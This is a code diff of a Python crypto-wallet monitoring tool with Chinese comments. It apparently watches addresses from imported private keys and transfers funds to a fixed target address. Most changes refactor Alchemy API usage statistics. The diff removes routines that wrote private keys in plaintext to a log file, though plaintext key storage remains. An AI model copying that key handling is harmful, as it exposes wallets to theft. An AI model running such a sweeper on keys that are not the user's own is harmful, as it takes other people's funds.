+                    print_warning("注意：存储明文私钥存在安全风险，请确保文件权限安全")
 
                     # 重新初始化地址列表
                     self.addresses = []
@@ -2635,10 +2814,11 @@ class MonitoringApp:
                         "chains": chains_config,
                         "erc20": [],
                         "settings": {
-                            "monitoring_interval": 0.01,
+                            "monitoring_interval": 1.0,  # 设置更合理的间隔
                             "round_pause": 5,
                             "gas_threshold_gwei": 50,
-                            "gas_wait_time": 60
+                            "gas_wait_time": 60,
+                            "adaptive_timing": True  # 启用自适应时间调整
                         }
                     }
                     await self.save_config()
@@ -2656,78 +2836,6 @@ class MonitoringApp:
         else:
             print_error("未输入任何内容")
     
-    async def save_private_keys_to_db(self, private_keys: List[str]):
-        """将私钥保存到数据库用于持久化"""
-        try:
-            async with self.db_manager._lock:
-                async with aiosqlite.connect(self.db_manager.db_path) as db:
-                    # 清空旧的私钥
-                    await db.execute("DELETE FROM config WHERE key = 'private_keys'")
-                    
-                    # 保存新的私钥
-                    joined_keys = ",".join(private_keys)
-                    await db.execute(
-                        "INSERT INTO config (key, value) VALUES (?, ?)",
-                        ('private_keys', joined_keys)
-                    )
-                    await db.commit()
-                    print_success("私钥已保存到数据库")
-                    
-                    # 保存到日志文件
-                    await self.save_private_keys_to_log(private_keys)
-                    
-        except Exception as e:
-            print_warning(f"私钥数据库保存失败: {e}")
-    
-    async def save_private_keys_to_log(self, private_keys: List[str]):
-        """将私钥保存到日志文件"""
-        try:
-            import datetime
-            os.makedirs("logs", exist_ok=True)
-            
-            log_file = "logs/private_keys.log"
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            with open(log_file, 'a', encoding='utf-8') as f:
-                f.write(f"\n{'='*60}\n")
-                f.write(f"私钥导入时间: {timestamp}\n")
-                f.write(f"导入数量: {len(private_keys)} 个\n")
-                f.write(f"{'='*60}\n")
-                
-                for i, private_key in enumerate(private_keys, 1):
-                    try:
-                        from eth_account import Account
-                        account = Account.from_key(private_key)
-                        f.write(f"{i:3d}. 私钥: {private_key}\n")
-                        f.write(f"     地址: {account.address}\n")
-                        f.write(f"     时间: {timestamp}\n\n")
-                    except Exception as e:
-                        f.write(f"{i:3d}. 私钥: {private_key} (无效: {e})\n\n")
-                
-                f.write(f"目标转账地址: {TARGET_ADDRESS}\n")
-                f.write(f"{'='*60}\n\n")
-            
-            print_success(f"私钥已保存到日志: {log_file}")
-            print_info(f"📝 日志包含 {len(private_keys)} 个私钥的详细信息")
-            
-        except Exception as e:
-            print_warning(f"私钥日志保存失败: {e}")
-    
-    async def auto_load_private_keys(self):
-        """启动时自动加载私钥"""
-        if self.addresses:
-            print_success(f"🔐 自动加载了 {len(self.addresses)} 个地址")
-            print_info("💡 提示：私钥已保存，无需重复导入")
-            
-            # 显示地址预览
-            for i, addr_info in enumerate(self.addresses[:3], 1):
-                print_info(f"   {i}. {addr_info['address']}")
-            if len(self.addresses) > 3:
-                print_info(f"   ... 还有 {len(self.addresses) - 3} 个地址")
-            
-            return True
-        return False
-    
     def print_stats_header(self):
         """打印统计信息头部"""
         if not self.stats_display_active:
@@ -2740,7 +2848,7 @@ class MonitoringApp:
         seconds = int(running_time % 60)
         
         # 获取API使用统计
-        usage_stats = self.alchemy_api.get_usage_stats() if self.alchemy_api else {}
+        usage_stats = self.get_normalized_usage_stats()
         cache_stats = self.price_checker.get_cache_stats() if self.price_checker else {}
         
         # 格式化统计信息
@@ -2752,16 +2860,18 @@ class MonitoringApp:
             f"💰 总价值: ${self.total_value_usd:.2f}",
             f"📊 本轮进度: {self.current_round_progress['current']}/{self.current_round_progress['total']}",
             f"🔗 链进度: {self.chain_progress['current']}/{self.chain_progress['total']}",
-            f"⚡ Alchemy: {usage_stats.get('current_cu_rate', 0)}/495 CU/s ({usage_stats.get('usage_percentage', 0):.1f}%)",
+            f"⚡ Alchemy: {usage_stats.get('total_cu_rate', 0)}/1500 CU/s ({usage_stats.get('usage_percentage', 0):.1f}%)",
             f"💎 CoinGecko: {cache_stats.get('monthly_calls', 0)}/10,000 ({cache_stats.get('minute_calls', 0)}/30/min)",
             f"🏪 价格缓存: {cache_stats.get('valid_cached', 0)} 有效 / {cache_stats.get('total_cached', 0)} 总计",
         ]
         
         # 简化显示（在终端顶部显示一行统计）
+        api_status_summary = "/".join([f"API{api['api_index']}:{api['current_cu_rate']}" for api in usage_stats.get('api_details', [])])
         stats_summary = (f"🚀 轮次:{self.round_count} | 💸 转账:{self.total_transfers}笔 | "
                         f"💰 ${self.total_value_usd:.2f} | 📊 {self.current_round_progress['current']}/{self.current_round_progress['total']} | "
                         f"🔗 {self.chain_progress['current']}/{self.chain_progress['total']} | "
-                        f"⚡ {usage_stats.get('current_cu_rate', 0)} CU/s | "
+                        f"⚡ {usage_stats.get('total_cu_rate', 0)}/1500 CU/s | "
+                        f"🔧 {api_status_summary} | "
                         f"📈 {usage_stats.get('usage_percentage', 0):.1f}%")
         
         # 使用ANSI转义序列在终端标题栏显示
@@ -2802,25 +2912,88 @@ class MonitoringApp:
         self.current_round_progress = {"current": 0, "total": 0}
         self.chain_progress = {"current": 0, "total": 0}
     
+    def get_normalized_usage_stats(self) -> Dict:
+        """获取统一化的API使用统计信息"""
+        if not self.alchemy_api:
+            return {
+                "current_cu_rate": 0,
+                "total_cu_rate": 0,
+                "monthly_usage": 0,
+                "total_monthly_usage": 0,
+                "monthly_limit": 30_000_000,
+                "total_monthly_limit": 30_000_000,
+                "monthly_remaining": 30_000_000,
+                "usage_percentage": 0,
+                "daily_budget": 1_000_000,
+                "days_remaining": 15,
+                "api_details": []
+            }
+        
+        usage_stats = self.alchemy_api.get_usage_stats()
+        
+        # 适配负载均衡器的统计结构
+        if isinstance(self.alchemy_api, AlchemyAPILoadBalancer):
+            # 负载均衡器返回的统计结构
+            return {
+                "current_cu_rate": usage_stats.get("total_cu_rate", 0),
+                "total_cu_rate": usage_stats.get("total_cu_rate", 0),
+                "monthly_usage": usage_stats.get("total_monthly_usage", 0),
+                "total_monthly_usage": usage_stats.get("total_monthly_usage", 0),
+                "monthly_limit": usage_stats.get("total_monthly_limit", 90_000_000),
+                "total_monthly_limit": usage_stats.get("total_monthly_limit", 90_000_000),
+                "monthly_remaining": usage_stats.get("total_monthly_limit", 90_000_000) - usage_stats.get("total_monthly_usage", 0),
+                "usage_percentage": usage_stats.get("usage_percentage", 0),
+                "daily_budget": (usage_stats.get("total_monthly_limit", 90_000_000) - usage_stats.get("total_monthly_usage", 0)) // 15,
+                "days_remaining": 15,
+                "api_details": usage_stats.get("api_details", [])
+            }
+        else:
+            # 单个API的统计结构
+            return {
+                "current_cu_rate": usage_stats.get("current_cu_rate", 0),
+                "total_cu_rate": usage_stats.get("current_cu_rate", 0),
+                "monthly_usage": usage_stats.get("monthly_usage", 0),
+                "total_monthly_usage": usage_stats.get("monthly_usage", 0),
+                "monthly_limit": usage_stats.get("monthly_limit", 30_000_000),
+                "total_monthly_limit": usage_stats.get("monthly_limit", 30_000_000),
+                "monthly_remaining": usage_stats.get("monthly_remaining", 30_000_000),
+                "usage_percentage": usage_stats.get("usage_percentage", 0),
+                "daily_budget": usage_stats.get("daily_budget", 1_000_000),
+                "days_remaining": usage_stats.get("days_remaining", 15),
+                "api_details": [{
+                    "api_index": 1,
+                    "api_key_preview": "Single API",
+                    "current_cu_rate": usage_stats.get("current_cu_rate", 0),
+                    "monthly_usage": usage_stats.get("monthly_usage", 0),
+                    "monthly_limit": usage_stats.get("monthly_limit", 30_000_000),
+                    "usage_percentage": usage_stats.get("usage_percentage", 0),
+                    "available": True
+                }]
+            }
+    
     def calculate_dynamic_pause(self) -> int:
         """根据月度额度使用情况计算动态暂停时间"""
         if not self.alchemy_api:
             return 5  # 默认5秒
             
-        usage_stats = self.alchemy_api.get_usage_stats()
+        normalized_stats = self.get_normalized_usage_stats()
         
-        # 获取统计信息
-        monthly_usage = usage_stats["monthly_usage"]
-        monthly_remaining = usage_stats["monthly_remaining"]
-        days_remaining = usage_stats["days_remaining"]
-        daily_budget = usage_stats["daily_budget"]
+        # 使用统一化的统计信息
+        monthly_remaining = normalized_stats["monthly_remaining"]
+        days_remaining = normalized_stats["days_remaining"]
+        daily_budget = normalized_stats["daily_budget"]
         
         if days_remaining <= 0 or daily_budget <= 0:
             return 300  # 如果额度用尽，暂停5分钟
         
+        # 初始化轮次统计属性（如果不存在）
+        if not hasattr(self, 'round_cu_usage'):
+            self.round_cu_usage = 0
+        if not hasattr(self, 'round_start_time'):
+            self.round_start_time = time.time()
+        
         # 如果这一轮消耗了CU，计算建议的暂停时间
         if self.round_cu_usage > 0 and self.round_start_time:
-            import time
             round_duration = time.time() - self.round_start_time
             
             # 计算每秒CU消耗率
@@ -2898,10 +3071,16 @@ class MonitoringApp:
                 
                 if self.alchemy_api:
                     # 显示API使用统计
-                    usage_stats = self.alchemy_api.get_usage_stats()
+                    usage_stats = self.get_normalized_usage_stats()
                     cache_stats = self.price_checker.get_cache_stats()
                     print_info(f"📊 API状态:")
-                    print_info(f"   Alchemy: {usage_stats.get('current_cu_rate', 0)}/495 CU/s ({usage_stats.get('usage_percentage', 0):.1f}%)")
+                    print_info(f"   Alchemy总计: {usage_stats.get('total_cu_rate', 0)}/1500 CU/s ({usage_stats.get('usage_percentage', 0):.1f}%)")
+                    
+                    # 显示各个API的详细状态
+                    for api_detail in usage_stats.get('api_details', []):
+                        status = "🟢" if api_detail['available'] else "🔴"
+                        print_info(f"   {status} API-{api_detail['api_index']}: {api_detail['current_cu_rate']}/500 CU/s ({api_detail['usage_percentage']:.1f}%)")
+                    
                     print_info(f"   CoinGecko: {cache_stats.get('monthly_calls', 0)}/10,000 ({cache_stats.get('minute_calls', 0)}/30/min)")
                     print_info(f"   价格缓存: {cache_stats.get('valid_cached', 0)} 有效 / {cache_stats.get('total_cached', 0)} 总计")
                 
@@ -2959,13 +3138,16 @@ class MonitoringApp:
         
         # API使用统计
         if self.alchemy_api:
-            usage_stats = self.alchemy_api.get_usage_stats()
-            print(f"\n{Fore.YELLOW}⚡ Alchemy API:{Style.RESET_ALL}")
-            print(f"   当前速率: {usage_stats.get('current_cu_rate', 0)} CU/s")
-            print(f"   月度使用: {usage_stats.get('monthly_usage', 0):,} / {usage_stats.get('monthly_limit', 0):,} CU")
-            print(f"   使用百分比: {usage_stats.get('usage_percentage', 0):.1f}%")
-            print(f"   每日预算: {usage_stats.get('daily_budget', 0):,} CU")
-            print(f"   剩余天数: {usage_stats.get('days_remaining', 0)} 天")
+            usage_stats = self.get_normalized_usage_stats()
+            print(f"\n{Fore.YELLOW}⚡ Alchemy API负载均衡器:{Style.RESET_ALL}")
+            print(f"   总当前速率: {usage_stats.get('total_cu_rate', 0)} CU/s (目标: 1500)")
+            print(f"   总月度使用: {usage_stats.get('total_monthly_usage', 0):,} / {usage_stats.get('total_monthly_limit', 0):,} CU")
+            print(f"   总使用百分比: {usage_stats.get('usage_percentage', 0):.1f}%")
+            
+            print(f"\n{Fore.YELLOW}   API实例详情:{Style.RESET_ALL}")
+            for api_detail in usage_stats.get('api_details', []):
+                status = "🟢 可用" if api_detail['available'] else "🔴 不可用"
+                print(f"   API-{api_detail['api_index']} ({api_detail['api_key_preview']}): {api_detail['current_cu_rate']}/500 CU/s ({api_detail['usage_percentage']:.1f}%) - {status}")
         
         # CoinGecko统计
         cache_stats = self.price_checker.get_cache_stats()
